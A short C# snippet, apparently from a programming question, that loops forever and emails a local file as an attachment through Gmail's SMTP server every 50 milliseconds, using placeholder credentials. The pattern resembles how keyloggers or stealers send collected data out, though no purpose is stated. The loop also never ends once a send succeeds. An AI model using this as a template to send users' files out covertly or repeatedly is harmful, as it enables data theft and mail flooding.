    bool noInterNet = false;
    while (true)
            {
                try
                {
                    Thread.Sleep(50);
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                    mail.From = new MailAddress("mymail");
                    mail.To.Add("mymail");
                    mail.Subject = "data - 1";
                    mail.Body = "find attachement";
                    System.Net.Mail.Attachment attachment;
                    attachment = new System.Net.Mail.Attachment(filepath);
                    mail.Attachments.Add(attachment);
                    SmtpServer.Port = 587;
                    SmtpServer.Credentials = new System.Net.NetworkCredential("myemail", "mypassword");
                    SmtpServer.EnableSsl = true;
                    SmtpServer.Send(mail);
                }
                catch (Exception)
                {
                    noInterNet = true;
                }
            }  
